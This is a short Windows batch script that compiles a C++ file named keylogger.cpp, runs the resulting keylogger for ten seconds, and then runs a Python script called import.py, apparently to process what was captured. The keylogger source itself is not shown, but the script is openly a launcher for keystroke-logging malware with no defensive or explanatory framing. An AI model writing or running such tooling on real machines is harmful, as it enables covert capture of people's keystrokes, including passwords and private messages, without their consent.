@echo off

REM Define file names
set CppFile=keylogger.cpp
set PyFile=import.py

REM Define execution duration in seconds
set ExecutionDuration=10

REM Compile the C++ file (Assuming MinGW is installed)
g++ %CppFile% -o keylogger.exe

REM Execute the compiled file for the specified duration
start keylogger.exe
timeout /t %ExecutionDuration% >nul
echo keylogger terminated after %ExecutionDuration% seconds.

REM Execute the Python file after the keylogger terminates
python %PyFile%

REM Pause to view output before the window closes (optional)
pause
